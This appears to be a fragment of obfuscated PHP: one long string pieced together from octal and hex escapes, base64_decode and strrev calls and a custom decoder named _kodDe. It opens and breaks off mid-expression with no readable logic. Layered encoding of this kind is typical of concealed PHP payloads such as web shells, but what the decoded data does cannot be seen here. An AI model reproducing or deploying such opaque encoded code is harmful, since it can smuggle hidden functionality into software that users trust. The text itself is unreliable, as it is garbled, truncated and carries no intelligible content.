Œ·—âef¯;¯Ïë¿=õ*lcæôùÏ7WXéİ._ùn~^').base64_decode('PGCnT3l5/WdXHNqRveu43IerPzuo7eF5xzz1VeqUlW988NFQZCD4kxe7X19558O3nfHq37Z2Bo87')."\174\356\257\336\317\166\34\363\327\273\26\255\370\323\33\371\373\306\22\367\337\374\305\352\7\56\273\372\107\276\175\327\366\370\327\135\365\322\313\211\365\355\377\176\344\316\273\227\276\364\361\355\57\14\276\372\235"."\xd\x47\x8e\xaf\xf8\x73\xeb\xae\xab\x86\xbf\xf5\x83\x73\xf\x79\xf5\xd2\xce\x5f\x2c\x1b\xb9\x73\x9f\xf1\xe4\x4b\x37\x6e\x8d\x5f\x68\x3e\x72\xfb\xbb\xef\x9c\x71\xf9\x27\xa7\xaf\x99\xfa\xe2\x2b\x47\xfe\x76\xdf\xce\x4b\x9e\xc9\x4e"."\xcf\xfe\x6d\x51\x79\xd9\x9b\xab\xa\x9e\x73\xd3\x7f\xbb\xfa\x3a\xe3\x7b\x47\x5d\xf7\xdd\x73\x1e\x8f\x9f\xe2\xef\xf9\xf8\xa1\x5d\x2d\xae\x53\x7f\x70\x49\xad\xef\x93\x52\xab\xbc\xf2\xb0\x9f\x5d\x30\xed\x5b\xd7\xa7\x7e\x7a\xd9\x2d"."\x4d\x77\x2c\xff\xde\x17\x17\x7d\xf1\xb7\xd3\x96\x6d\x98\xee\x6c\x49\xd\x8e\x9d\xda\xb9\xd9\x7b\xfb\xb9\xa7\x75\x7f\xeb\xc6\x96\xbf\xfe\xfe\x98\x87\xf\x5d\x77\x52\xb2\x79\xc7\xe5\x17\xbc\x31\x65\xc6\x8f\xa7\xff\xe0\x9e\xd5\xd7"."\37\323\30\177\171\377\15\133\236\372\343\313\33\237\331\166\104\354\272\61\327\346\243\373\166\337\362\275\251\33\206\172\32\216\133\375\140\374\312\256\216\117\56\176\340\234\253\66\77\362\316\273\233\176\176\121\363".base64_decode('9MuGPpm1+aIrdv7wpOCmcy7r/PtldVM++Xjq9Wfs+N2dq948X12y4qmbgr3KlpbVqxfd995z//7p').base64_decode('vI6a2trBd3952bWn/a7vs6S2ZXRWMV28/u7Vrz638M4jDn93ynM/fGHNex8v+/SAPV75TlEplh++').base64_decode('e2jL60OnfDJlYuS82b0XHvPS8zc1HXzEzGXrapbedG/Cedce6Ya7Dkluzndtc/znzFWXyWNPnNLQ')."\x78\x46\xa0\xfe\xbc\x5d\xb\x3\x8f\x8f\x5d\xbe\xb7\x1c\xfb\xeb\x69\x1f\xbc\xb2\x6f\xcd\xf3\xee\xa7\x5b\xf7\xdc\x4b\x8a\xad\xcd\x9c\x39\x63\xfc\xb8\xff\x6b\xbf\x21\x76\xd9\xfc\x27\x96\xcf\xbe\xf9\xbc\x65\x83\x1b\xf\xd\x7f\xe2"."\313\373\377\146\34\166\333\264\113\366\170\340\216\115\117\357\353\175\102\72\341\336\135\237\325\236\362\360\304\277\137\170\101\173\370\336\177\175\262\161\343\161\153\326\376\353\315\67\243\77\374\342\331\317\316\16\156"."\xd9\xfd\xf7\x67\xb4\x5\x5f\x7d\xf1\xc9\xfb\x1b\xf7\xbf\xf1\xde\xf1\x8f\x2f\xf9\xf0\x94\xb5\x97\xfc\xdf\x97\x3b\x82\x2f\x3d\xd3\xf1\xc0\xee\x2f\xbe\x7a\x3a\xf6\x9f\xbf\x7d\xf2\xd3\x6f\xdf\xfe\xf0\xee\x57\xff\xf0\xf0\x82\xff\xbc"._kodDe('Kr5tYzfTQdLvCyex0bXh6xuOydt6rqDV7WeuxNLia26y6J2z22hy3s1yB73punojO9wvoapYI/LjWQ==')."\271\64\177\365\227\257\237\376\370\33\47\237\322\170\364\61\77\271\252\143\315\227\207\376\371\240\357\16\46\136\75\161\323\275\327\4\117\123\217\174\366\213\65\163\142\321\272\47\103\313\157\313\56\31\371\154\375".base64_decode('lwumbPG8dt22zjsvHb7jldr/zKn7yc3nG8k3z19cvPP5A6+5bfnFx51/0I2pSxtu2ascuHzGRZe9')."\xf3\xeb\x19\xc9\xc7\xde\xd8\xf5\x57\xff\x7\xbf\x6d\xd8\x73\xc3\xbe\xef\x3c\xe3\x78\x36\x62\xfe\xe0\xf5\x43\x4f\x3a\xf6\xc8\xb7\x3b\xbf\xf7\xd4\xad\xaf\xde\xbb\xd7\x7f\xf6\xbd\xf9\xc8\x1f\x8d\x5e\x7f\x38\xd5\x9a\x6e\x39\x71\x16"."\x91\x17\xc9\x96\x24\x63\x8e\x8f\xd2\x23\xa7\x59\x73\xe6\x92\xc0\xac\x46\x2a\x55\x12\xc8\xec\x59\x27\x92\x24\xfc\x93\x37\xa\xd9\xe2\x30\xb9\x9e\x28\xa5\xb3\x13\x9\x99\x6d\x54\xc7\x73\x49\x9d\x9c\xc9\x11\x99\x34\x9e\x1f\xcd\x14"."\312\23\4\333\120\313\251\11\162\376\60\154\304\163\345\14\221\312\25\263\74\32\327\311\21\326\274\71\370\267\251\211\24\222\55\45\322\343\111\362\311\162\51\123\324\14\242\360\223\0\215\120\351\125\54\321\152".base64_decode('HUunRnJxpumZGCuVyfYvWRou5MaJ1D1vLmnQvHnNdD+ULKoJohRElClmt8yluy05PlEkR6Vzqcg9')."\136\222\323\271\74\271\41\322\213\162\132\215\223\115\371\110\52\63\154\352\244\147\232\133\110\223\22\246\234\124\324\141\122\321\242\221\110\215\123\5\362\314\210\66\232\42\175\123\316\230\251\61\203\240\65\65\223"."\x21\x99\x35\x9b\x7c\xb5\x38\x9e\x2d\x8d\xc4\xc9\xd0\xcd\x9d\x4d\xf\x7a\x4c\x90\x25\x4e\x4a\x48\x16\xca\xe9\x52\x7c\x98\xe\x21\x69\xcd\x9c\xb9\xa4\x35\x73\xe7\x91\xa2\x94\xbc\x3e\x1a\x4f\x67\xe9\x97\x8\x54\x4e\x67\x26\x4a\x66".base64_decode('mX6W5FZzGSMpkxErFxV5IkNaTklrDu3TuS20RBI4sYVcLWrlUnJEJhWbO7eZtR60iUALyfGxrELG')."\141\326\134\222\161\264\54\217\24\207\111\157\25\13\331\314\10\325\211\110\224\324\174\322\40\33\271\331\163\50\31\30\151\65\227\47\105\46\262\371\211\102\206\20\215\72\221\322\223\171\322\346\361\334\160\166\264"."\x44\x9a\x3a\x7b\x76\x33\x1d\x3d\x45\x4b\x67\x49\xe6\x13\x9b\x48\x15\x52\x13\xe5\x74\x5c\xa3\xf4\x3b\x92\x2f\x17\xe8\x1e\xb3\x99\x76\x6c\x31\xa3\x8d\x8e\x98\xa4\x96\xf3\x5a\x48\x7f\xd2\x7e\x55\xa\x79\x35\x9d\xa1\x7a\xc7\xe3\x19".base64_decode('RaOqg7SVhfxwcjRL58u4OZLVyF1vM5mGLXQ4lMKIkU7Rg6jkyES6SA5Cx7PpxGiGqo5kEuOjKunN')."\11\163\134\316\214\322\215\164\71\147\52\45\172\145\154\224\342\143\43\244\264\26\112\60\272\126\310\217\15\223\26\253\200\130\365\254\101\331\11\155\333\211\164\272\316\41\155\230\327\110\40\47\316\43\344\220\31"."\117\44\207\47\122\164\104\111\137\215\307\13\23\245\64\351\372\271\163\310\47\47\64\260\301\37\46\254\240\34\317\313\143\164\150\233\232\11\112\323\54\122\256\221\60\323\5\212\233\313\224\214\54\265\377\110\47"."\x65\x73\xa2\x44\x1a\xda\x4c\xb9\x5b\x33\xe5\x65\xb9\xa4\x3c\x51\x2e\x91\xa6\x9c\xd8\x48\x8a\x5b\x9e\x23\x9b\xee\x4e\x39\x31\x42\xf\x77\xc1\x46\xdd\xa4\x1d\xcb\x10\xa8\x4a\x7c\x42\x54\x99\x1c\x51\x14\xaa\xf7\x47\x35\xb\xf9\xcd"."\255\121\104\172\274\64\235\157\353\341\171\210\160\303\13\243\141\21\67\221\67\205\144\20\263\244\302\123\162\170\372\200\143\141\123\323\331\75\67\126\107\161\301\132\271\254\215\150\154\262\140\44\343\226\164\6\245"."\xe7\x14\xf6\x94\x94\x1d\x1e\x47\xdd\xc5\x2e\xfb\xe1\x7f\xa4\x31\xd8\x90\xc2\x50\x46\x8b\xa\xd3\x7\xc6\xd8\x2e\xda\x47\x71\xa1\xaf\xf1\x59\xb5\x29\x1b\x23\x2e\x11\xec\x14\x53\xd5\x3c\xf8\x74\x36\xeb\xb2\x1a\xd8\x40\x6b\xb\x3a"."\64\61\256\304\311\133\310\57\31\5\30\357\127\241\53\254\3\45\50\163\25\222\32\203\46\15\213\341\17\341\71\271\161\30\25\302\266\26\273\170\315\352\140\260\276\132\217\13\265\42\155\165\303\266\272\121\201"."\x42\x3b\xc5\x34\x5c\xb\x9e\x68\x1b\x43\xb1\x49\x69\x76\xb6\xcb\xf\x1a\x49\x5\x79\xed\xc8\x39\x7e\x45\x47\xa2\xa1\xb7\x52\xa4\x85\x28\xac\xb4\x4c\x4e\xfc\x90\x69\x8c\x43\xc2\x1f\x74\x48\xe8\xca\x4d\xb2\x9a\x6d\xf8\xbd\x12\xbb"."\x9b\x14\x47\x5e\xac\xa4\xae\x14\xb2\x72\x82\x55\xb0\x30\x2e\xa5\x64\x90\x35\xd9\x2a\xa5\xc0\x4\x90\xa8\xd2\xb0\x64\x6a\x34\x2c\x56\x4d\xbc\xfb\xb3\x35\xc6\x32\xa1\xec\xcd\xb1\x24\x82\x1e\x2f\x32\x53\x8\x76\xbf\x60\xb9\xeb\xd2"."\xba\xb2\xb2\x61\x70\x9d\x4a\x74\x27\xca\x1b\x81\xa3\xec\x42\x23\xc\x8a\x66\x77\xb9\xba\x92\x54\xa9\xa\x9b\x92\x43\x98\x54\x6d\x14\x5d\x58\x30\xdd\xb9\x44\x56\x91\x75\xcb\x65\x49\xdb\x82\x42\xa6\x0\x8d\xe1\xcc\xf9\xb\x88\x69"."\16\271\5\212\11\337\45\141\256\237\54\102\263\366\13\30\72\301\134\336\116\301\152\15\242\11\71\260\112\316\174\310\206\332\71\224\254\205\171\30\16\25\363\60\225\50\202\273\205\374\56\216\132\46\312\161\51"."\x52\xb1\x5e\x6b\xfb\x41\x85\x9d\xac\x4b\x40\x33\x1\xcf\x4d\x1a\x48\xd\x88\xcc\x82\xe3\xc9\xf8\x8\x96\x38\x21\xde\x9b\x30\x3b\xea\xdc\xaf\xc9\x6a\x8a\x4d\x2f\x0\xbe\x9e\x67\x5a\x3d\x46\x56\xa6\x17\x3a\x6\x60\xf6\x6a\x5e\x61".strrev('¬Wa=:SHbYÌV–"³f¬‰bëÕƒ\'à”b)ÉšqA!«¼¶zƒT‰úóßÀt±Ø4Pã')."\xdf\x43\x75\x66\xe5\x42\xc1\x5d\xf9\x31\xd0\x4d\xa0\x97\xe5\xb8\xa6\x9b\x2\x9\xc5\x92\xaa\x70\x1\x11\x2b\x14\xed\x85\x8b\x6\x94\x9e\x7e\x7f\x2c\x1c\xe\xa\x9f\x6a\x15\x38\x1a\x54\x88\xe7\x57\x90\x30\xc6\x15\xe3\xe1\x21\xbc".strrev('$†\'’AØÅT\'ˆá9§lçTÁğ\\q5tjíœcÓ=][@,1ÇPn€µ\'Mei=x')."\103\117\160\251\324\25\14\14\364\366\205\261\165\37\206\367\5\205\164\244\255\146\111\26\301\244\130\137\177\300\323\345\223\374\175\221\40\125\103\145\332\270\110\1\71\314\342\264\351\272\241\60\343\106\222\37\107"."\x44\x25\x69\xb1\x44\x56\x12\x99\x2d\x83\x8e\xda\x68\x4d\xb4\x21\x5a\x17\xad\x5f\xe5\x8a\x1a\x43\x64\x52\xaf\x12\x47\x84\xac\x37\xfd\x5e\xd2\xa2\x56\x16\x62\x8b\x54\x6f\x38\x7c\x32\x51\xc1\xf\x86\x3c\x5d\x1\x5a\xb\x40\x4d\x24"."\30\354\362\343\300\316\113\267\156\273\377\202\235\233\156\337\176\356\172\120\320\216\53\117\333\261\361\236\155\367\256\177\357\364\7\267\337\176\376\316\207\56\330\161\351\226\35\347\377\210\124\375\275\55\277\334\366"."\340\303\73\57\335\274\375\366\313\167\154\270\157\347\225\147\340\204\367\157\336\272\375\274\315\254\142\322\373\227\74\264\343\202\33\167\134\366\213\35\353\157\337\176\377\45\333\177\165\332\366\173\357\165\200\334\357"."\237\271\176\347\203\267\357\70\147\303\216\237\236\272\343\356\165\73\256\132\277\375\274\353\266\137\261\171\347\5\133\266\137\177\372\366\263\326\277\267\345\262\343\355\264\203\343\203\164\24\310\35\263\173\145\324\150"."\250\303\75\33\65\146\302\136\255\7\277\165\120\241\25\374\122\75\76\100\161\141\150\215\322\327\345\263\53\210\213\121\142\24\332\200\211\2\322\64\23\143\14\142\124\112\343\61\144\63\120\73\151\55\326\220\241".base64_decode('FyolVMbrC3eF/J0+ojLJBmoGUt0jV9cAGg4tYWFmRVFhyivVUVPeesnSENmV0LLFXB5VVqqBOiI1')."\16\310\342\221\200\43\325\300\45\12\0\224\4\230\155\165\320\42\20\151\243\325\56\257\165\64\72\232\352\45\142\347\213\163\20\273\136\251\206\330\364\262\174\226\217\70\342\226\130\223\243\261\136\252\51\214\324"."\x90\x7a\xf1\x7e\x5\xb5\x8f\x61\x4c\x43\x92\x1d\x75\xa4\xc2\x62\x75\x39\x2e\x60\x51\x86\xa9\xcb\x2a\xe0\x59\x52\xc2\xc1\x40\x2c\x3f\xf8\xb5\xd8\xea\x26\x5c\x3c\x7\x1e\x27\x80\x61\x87\x49\x9e\x3e\xaf\x15\x13\x9b\xf8\xf6\xd7\x4a"."\162\76\11\122\160\377\212\303\134\133\57\305\211\122\152\225\104\224\315\322\31\355\226\316\250\233\111\130\104\377\42\66\336\130\217\124\302\106\10\270\132\262\101\7\212\100\321\120\101\50\36\55\212\253\201\146\200"."\301\301\370\40\300\122\106\224\161\136\22\340\104\54\201\216\40\204\263\101\254\222\206\154\257\153\260\200\205\333\231\63\322\224\313\21\343\337\336\345\254\15\224\226\311\20\50\334\162\33\232\123\370\42\135\75\230"."\312\303\2\231\47\343\63\54\204\312\273\123\262\220\110\226\32\351\21\74\74\135\40\103\330\37\341\371\373\272\203\241\136\154\106\20\356\352\361\365\172\134\204\177\143\112\300\370\120\220\221\332\245\132\310\371\60"."\250\326\322\375\350\103\264\313\42\350\253\140\136\305\114\305\60\161\57\24\322\244\62\144\364\45\144\47\46\243\54\355\265\330\162\222\24\311\34\15\4\103\221\30\350\0\302\236\5\256\133\53\54\24\242\106\146"."\x51\xd7\x4b\x6c\x43\x88\x45\x7b\x2e\x2b\xc9\x33\xb9\xa0\xa5\x24\x9\x73\x4c\xc9\x9\xb0\xf7\xa3\xe6\xc4\x71\xea\xb5\x0\x54\x1\x7e\xb9\x2b\xd8\xd7\xed\xa7\x76\x15\xde\xb8\x25\xcd\x1b\xf2\x43\x9b\x3e\x52\x39\x89\x96\x10\xe3\x77".base64_decode('6SBSKCdZmBvDwQS27IMIX/VhiuA8AX4m3MfCXJoEEagHxznwUi8L9zCTKJgQDAkRT8jTG2bR0FLA')."\321\41\114\60\375\351\365\204\43\240\125\175\3\275\234\353\7\74\113\0\301\4\271\134\102\71\166\235\253\141\101\175\24\33\66\340\40\376\131\110\143\120\71\174\150\165\223\103\232\263\266\236\340\120\123\200\230"."\231\121\363\124\242\205\137\71\71\20\13\4\27\341\70\162\352\340\313\47\271\300\57\15\112\100\40\216\160\201\330\240\313\27\233\21\22\240\143\11\133\113\111\175\301\245\36\356\41\100\110\300\20\42\162\113\334"."\157\200\173\345\140\264\34\165\1\221\301\130\305\355\25\274\235\22\25\106\272\240\150\110\24\351\111\156\17\135\121\351\322\341\40\201\130\126\113\123\73\140\300\42\251\0\201\177\227\321\0\342\236\44\3\330\67".base64_decode('FrLUfgEbTsSia6InRJ0ubCsCJZmog9cs5lsGVt1w2GLoEkMW86R00GYSwvMYR9rID9nstJGeINGO')."\166\66\264\276\223\327\364\201\177\213\42\153\174\340\137\0\374\4\42\140\360\124\206\0\46\151\300\277\330\267\6\376\341\11\365\222\210\340\357\133\3\376\2\26\263\306\337\147\317\334\351\213\54\365\371\60\2"._kodDe('MYD6e0xF91b7zYfQ3w2RWKLvf9ur8XXh0J6gCkUp173U57m5RflaV/1jTmKOwKJXiBe29s9eZFjrjg==')."\203\112\22\100\132\301\326\361\147\56\54\110\174\121\50\70\320\57\304\173\74\113\374\175\213\150\314\335\100\103\15\324\342\336\353\17\203\56\352\242\64\310\75\153\210\161\42\162\42\301\110\24\171\55\4\355\5"."\xbc\x1d\x44\x4\x41\x1c\xee\x0\x30\x6f\xb6\xce\xb1\xce\x1\x7f\xc0\x2b\xda\xf2\x41\x44\xb2\xa4\x20\xbe\x4e\x56\x95\x19\xb4\x72\x34\x8e\xac\xfa\x68\x4\x76\x39\xd\x23\xf2\xa2\x11\xd4\x7\x34\x82\x3b\x80\xc6\x50\x77\xd1\x8\xf2".base64_decode('4EEjqKE0Arckvj6aBjafYONId5RprjuakUvMRmV+Mi6Yn0IG7MKuGqAVMdinyewMzXYUho55fHBM')."\311\2\202\224\263\44\301\74\16\236\251\11\47\63\156\214\1\44\121\204\3\176\243\253\26\40\111\171\25\45\131\154\222\145\106\124\63\153\371\50\161\214\1\76\352\107\26\61\302\147\311\132\317\217\162\260\276"."\x66\x4c\x13\x14\xd6\xc3\x8\x44\x8e\xf7\xf8\x31\x89\x75\xe7\xc4\x38\xd0\x2a\xb6\x21\x22\x66\xae\xe\xf2\xab\xf3\x66\x59\x15\xee\x20\x84\xd0\xc1\x41\xf8\x27\x4a\x70\xa3\xa4\x6\xc4\xb2\xa5\xd6\x41\x97\xe9\x18\x37\x92\x34\xf5\xa2"."\xa0\xdd\x89\xf4\xcc\xc0\x80\x78\xb8\xfd\x13\x53\xc6\x44\x69\xc5\x38\x44\x16\x3b\x1e\x1d\x4b\x81\xc1\xa0\xa6\x4a\x48\x66\x20\x55\x37\x35\x89\x63\x59\x75\x48\xa9\x8d\x24\x76\x88\x62\x57\x10\x13\xc1\x5c\xc7\x8c\x9d\xfa\x52\xd5\x36"."\40\46\344\54\31\6\4\63\45\71\311\115\163\144\146\134\144\146\270\31\226\350\204\304\333\111\173\240\230\67\303\112\226\34\335\173\343\110\257\216\253\160\263\356\60\4\175\73\164\34\306\333\207\75\276\330\62"."\x92\x92\xfc\xac\xca\x2\x16\x7\x6\xb8\xbb\x11\x78\x12\xc5\xcb\x9c\x50\xe9\x71\x33\xab\x41\x5e\xeb\x57\xf4\x9c\x8a\xce\xd3\x96\x72\x65\x5c\x96\xae\xf0\x51\x42\x1a\xcf\xec\x4\x1f\x9d\x74\xe6\xad\x7e\x4e\x8a\x79\xf0\x85\x7e\x36"."\x0\xce\x26\x8a\x4c\x5d\x43\xa1\x31\x97\x98\xb8\xc4\x34\x4c\x41\xcf\xa3\xbc\x82\xbe\x22\x9a\xc2\xa4\x58\x3d\x8b\x9\xe3\x78\x5b\xe5\x4c\x4d\xeb\x95\xf3\xe3\x11\x6d\x89\xaa\x10\x4a\xf3\x6\x97\xf6\x5\x82\xd4\x45\x2\xf5\xa7\x42"."\370\7\271\40\2\33\23\335\105\43\46\15\124\157\222\56\223\372\54\245\253\16\242\123\356\104\353\170\221\14\320\170\162\202\362\204\272\172\200\230\30\353\366\3\31\332\267\214\210\142\213\203\336\130\70\70\20"."\xa2\xa7\x1a\x30\x8e\xcc\x1a\x42\xbe\xae\xe5\xec\x94\x81\x41\xbb\x3d\x4b\xec\x10\x58\x5c\xc4\xb3\xa8\x2a\x98\x9\x89\x10\x8e\xf8\x71\x2c\x14\x84\x12\xb5\x2f\xd0\x6d\xcb\x10\xee\x61\xde\x28\xac\xb0\x58\xc0\xdf\xb7\xb8\x6a\x42\x24"."\x18\xeb\x15\xb2\x60\x20\xd8\x57\xf7\xda\x61\xd6\x12\xc2\x3e\xd8\x15\x3c\xde\x19\x8\x76\x9\xc9\xfe\x60\x65\x4f\x80\x45\xc0\x6\xc4\x22\x37\x5d\xa8\xeb\xa2\xab\x11\xe7\x6d\x5\xc\x38\xb9\x6\x2e\xdb\xce\x18\x58\xf5\x17\x44\xd7"."\xd6\xd7\x45\xdd\xb\x5c\xd\x4c\xd6\xc4\x43\x23\xe8\xea\x57\x7\xab\x46\xc4\xc2\xc6\xdc\x2e\x17\x29\x80\x5\x80\xa4\xcb\x4c\x84\x29\xd\x12\x77\x3f\x61\x6c\x58\x69\xf9\x2\x91\x14\xd6\xa\x4e\x32\xa0\x9d\x88\xcb\xee\x54\xc3\x8f"."\xcf\xb\x63\xe1\xe5\x61\xd6\x93\x78\xd\xa8\x96\x6e\xa1\x1d\x8c\x26\x1e\xa5\xdb\x90\xc1\xbf\x7e\x11\x35\xa2\xe4\xa\x55\x11\x2d\xc4\x67\xb1\x66\x10\x41\x2e\x55\xe3\x3d\x84\x17\x25\xd1\xae\xa\x23\x71\x8c\xd5\xaa\xd6\x4a\x67\x62"."\xa2\x8\xad\x3b\x79\x7f\xf3\x59\xc\x40\x2e\xce\xae\x48\x49\x7c\x53\x44\xe6\xb0\x53\x74\x9d\x4\x7b\x5d\xe4\xbc\xc9\xb8\x6d\xea\x11\x40\x96\xb1\x4e\x61\x82\x72\x60\x33\xbd\xd3\x5b\xee\xcc\x39\x93\xd1\xc8\x22\xe8\x83\x22\xba\x82"."\x55\x50\xd5\x5\x27\x10\x9\x2d\x9f\x54\x5\x8b\x1a\x39\x41\x99\x6c\x11\x6c\x29\xe9\xa9\x37\x5c\x7f\xc\x67\x59\xa5\x5d\x30\x9d\x19\x8f\x92\xfb\xa4\x98\x8c\x4c\x9f\x63\xe2\x55\xe0\xa8\xd3\x50\xd3\x79\xa7\x9c\x4d\x6b\x80\x7\xd3".base64_decode('q+5RpzxiSecORAoa2DBTH3hO8AkhDSODwunSAg/Jmd8VGDFYTKQc2KfssoRb0AmrSRhVuVWaRXwT')."\x75\x83\x75\x4e\xd0\xdd\xe\x16\x4d\x3f\x74\x3a\xc3\x2d\xa9\x20\x9b\x44\xee\x78\xc8\x5a\x2e\x71\x5f\x66\x54\xb2\xae\xce\xd9\xa1\x14\x27\x28\xa3\x53\x6\x91\x1b\xe1\x77\x6b\xb9\x11\x76\x30\x4f\x97\x79\x5a\xf5\x92\xd2\x2d\x5c\xc1"."\361\375\65\161\63\6\322\72\307\351\255\26\121\35\357\34\207\312\355\25\313\37\264\153\22\175\257\171\226\206\147\71\173\172\75\135\116\300\346\232\147\223\33\373\345\71\100\73\75\52\243\34\271\154\314\212\101"."\xdf\x2\xa\x15\xd4\x66\xce\x91\x32\xa0\xab\x9\x49\x54\x7a\x66\x99\x6e\xf5\xff\x83\x81\xd8\x71\x8\x90\x39\x93\xf0\xfe\x84\xe\x2\x86\xda\x48\x5\x3\xb9\xdc\x82\xe3\xd8\x20\x9d\xde\xc2\x65\x64\x56\x61\xd8\xc\x1c\xaa\xf6\xdd".strrev('1ødl 5W²@»àßé2Ş#İx)ÀåÄ%aÆDÆşÂèP¹I#d»ò¬»¾Ù—wÚ¬»¿Ue')."\262\117\11\23\302\122\334\67\372\360\221\350\222\300\12\202\162\27\142\353\30\62\203\250\175\144\145\303\204\142\11\77\304\200\26\226\275\114\24\322\51\145\273\65\303\250\162\31\5\240\22\276\131\52\142\46\44"."\x21\x11\x54\x81\x6e\x15\x55\x43\x92\xe3\x79\x4d\xcf\xd1\xb1\x21\x2e\x91\x98\x77\x1b\xe6\xfb\x86\x3b\xc8\xc1\x7b\x44\x1c\xf6\x31\xa3\xc9\x5e\x79\xcc\x93\x56\xc2\xa\xe4\x6d\xa4\xa3\x7c\x63\x5\xcd\x50\x44\xb7\x4a\x49\x5\xb9\xeb"."\x60\x16\x34\xf2\x18\xe4\x38\xf4\xce\x55\xd6\x47\x68\xca\x98\x13\xd4\xda\xe6\xdf\xc7\x50\x94\x11\x2a\x35\xa\xc2\x39\x13\xc8\xfb\x99\xdf\x1e\x7b\xdd\x60\xf\x3a\x73\x16\xf7\x67\xd4\xa5\x90\xe8\x80\x41\xb5\x18\xad\x72\x36\xa8\x73"."\xf\x4e\xe8\x78\xd1\x59\x15\xe0\x14\x2c\xd0\x30\x7b\x10\x9c\x72\x81\x86\xa4\xd9\x68\x38\xc9\x84\xce\xa0\x9e\xa1\x77\x7f\xf8\x67\x45\xb5\xea\x39\x75\xee\x8b\x29\x18\xe\x63\x8f\x74\x8b\x95\x71\xea\xd5\xc8\x36\x25\x6c\x8e\x90\xa2"."\x8b\xa2\xbd\xd1\x88\xd8\xaf\xa6\x2e\xa7\x52\xa0\xda\x82\xef\x14\x4b\x5d\xc0\x37\x24\xda\xf4\xc9\x9d\x36\x91\x6d\xf2\x9\x55\xdd\x34\x91\x44\xe4\x3a\xcc\xad\xa3\x9b\x57\x47\x39\xc6\x28\x15\x39\xc3\xac\x42\xab\x8\xfe\xdf\x53\xab".base64_decode('SDJwxaYzlF/0FoqCP1csmPcjz1uUqQjbEuTxivijYy6oQLfmO7UkWSFX1wB6rWmtmV4HfutrHDVQ')."\2\103\161\70\302\20\200\276\135\323\72\275\16\5\352\211\1\347\4\321\21\24\134\310\360\143\134\262\341\130\40\233\246\160\374\260\0\365\35\234\370\315\356\146\167\231\360\230\5\243\360\213\334\301\244\175\301"."\30\213\1\36\111\257\225\143\42\247\46\153\0\31\43\61\245\207\325\204\362\360\136\357\154\312\162\75\275\53\234\334\251\123\333\202\261\134\126\42\116\230\332\153\233\134\215\265\22\365\70\332\136\73\20\351\166".base64_decode('zqtd0DG1rQudQ5pKLzxIhA61sPvNDnJ60AbnKou4rbHJ8hLel5MntDxYF8EOO+dKUH3E/4XHcVdd')."\171\305\54\153\72\71\216\45\154\267\231\152\243\145\4\306\225\63\310\364\305\246\250\255\360\234\202\366\320\100\141\274\230\167\166\1\311\301\211\205\240\326\152\13\142\153\243\25\37\72\135\265\342\213\174\25\162".base64_decode('rJiNY3GGlONB7EuxVRIdbAq+j5xQ7MDznO6VCQxyYQpSRU9SdGIstNUXjoYTyG1wioBZCpZzU6mG')."\x62\x75\xd9\x68\x77\xe4\x68\xef\x5\x94\x5\x8e\xbf\x53\xf4\x10\x39\x6\x44\x74\x98\x9c\x57\xc6\x4c\x27\x24\x1\x27\xf5\x5f\x51\x99\xc2\xe7\x7a\xd5\xaa\x26\x8\x35\x55\x43\x19\x28\xaa\x49\xfb\x27\xd1\xd1\xb7\xb3\x58\xa4\x1f\xac"."\132\250\270\201\240\10\250\21\176\126\236\105\224\227\301\130\63\351\335\276\33\20\316\210\52\375\305\201\371\55\65\267\264\316\76\21\374\117\370\55\75\271\57\26\314\166\26\244\376\344\216\167\247\50\253\340\376"."\x1d\x69\xdb\xe0\xe8\x5a\x9c\xe8\x9\x60\xde\x8d\x8c\x9\x50\x1e\x63\xc1\xe3\xb5\xb5\x78\x7\x25\xd\xc5\x7b\x57\xc1\x75\x60\x15\x9e\x9a\x54\x4a\x74\xbd\x25\xcb\x6d\x9e\xef\xa3\x58\xbf\xa7\x69\x40\x67\xf8\x32\x27\xfb\x78\x76\x84"."\x57\x38\xe\x6f\xe2\x8\xd5\x8e\x80\xfa\x68\x5c\x3a\x43\xb\xb3\xc0\xe2\x13\x99\x62\x7e\xa4\x5d\x48\x94\x4c\x4d\x93\x72\x72\x7e\x9c\xec\x1b\x66\x18\xad\x33\xc\xac\x4e\x35\xc3\x35\x2b\x65\x80\x8\xe1\xdc\xcc\xdb\x25\x5c\x74\xb8"."\377\16\154\220\113\122\300\262\14\205\107\350\74\324\5\27\267\120\221\140\365\147\213\314\353\144\1\205\111\15\373\3\3\213\374\175\302\135\233\0\210\165\171\373\142\236\376\376\252\11\114\16\62\325\204\33\236"."\117\273\206\251\257\344\4\45\236\66\65\227\226\22\120\37\256\275\6\102\153\44\103\117\120\317\102\65\156\302\121\21\2\337\151\265\251\44\113\55\314\42\245\0\65\70\121\10\47\327\166\264\271\325\16\326\331"."\xdc\xfc\x59\xd7\xb8\x82\x9f\xcb\x3d\xd\xee\xbb\xdc\xf0\xfe\x2a\x7f\x2\x1c\x5d\xf1\x4c\x1d\x41\xbb\xb9\xb1\xb3\x24\xb5\xc9\x12\xee\xc7\xf6\x5a\x78\xd9\x90\xaa\x95\x32\x60\x91\x66\xd7\xf9\x1d\xf6\xcc\x7d\xf4\x38\xb8\xcd\x2d\x8b".base64_decode('iXAChTQqYbO9V4kd6lU9rfQkbD4ou+T8ksossHBXolqSGx0GuAXfpeT0QlS9svgbsZ7bsqPCKgRS')."\220\23\43\220\246\70\123\307\311\56\222\320\17\367\66\70\301\342\33\321\24\356\15\100\305\301\247\340\336\126\127\323\31\172\264\264\32\27\4\127\377\265\153\53\141\104\55\301\236\344\51\250\166\20\244\35\73"."\14\156\317\71\14\254\116\326\317\140\272\25\221\70\204\342\4\372\26\361\14\170\161\347\161\220\70\110\65\176\120\54\72\130\353\152\130\273\326\255\322\253\272\150\215\65\257\213\141\343\170\324\145\305\7\65\47".strrev('…ÄÆ²3.>®Áe,Œã"yGšmPQ¦ˆw|ìƒíít÷‚NJì¯ºànê›tÈ“ÈÅ‰À	Í]')."\x34\xb\x3d\x56\x7\x52\xb\x4a\xcc\x55\x29\xee\x45\x31\xec\x29\x14\xc4\x28\x7d\x8f\x1\x7a\x9d\x71\x67\xd5\xb8\x9b\xcd\x6f\x37\x82\xb9\x12\x5c\xd7\x96\xa2\x20\xee\x62\x83\xc3\xfb\x34\x5b\x2\x54\x85\x44\xe0\x12\x60\x7f\x40\x9c"."\32\266\303\101\131\14\310\2\155\106\102\127\13\246\205\63\141\17\377\65\310\271\354\260\134\222\61\112\215\104\35\213\327\40\127\171\65\200\23\341\24\302\2\170\125\332\40\313\221\164\45\333\136\203\252\153\144".strrev('ñ	!H¡wkÈ(J4úwø•´Ò²-Ë}<õtD 